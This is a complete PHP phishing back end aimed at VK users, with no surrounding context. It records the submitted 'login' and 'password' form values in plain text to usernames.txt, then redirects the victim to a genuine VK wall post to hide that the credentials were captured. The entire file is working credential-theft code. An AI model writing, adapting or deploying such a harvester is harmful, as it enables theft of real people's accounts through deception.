<?php

file_put_contents("usernames.txt", "Vk Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://vk.com/wall-170669723_53');
exit();
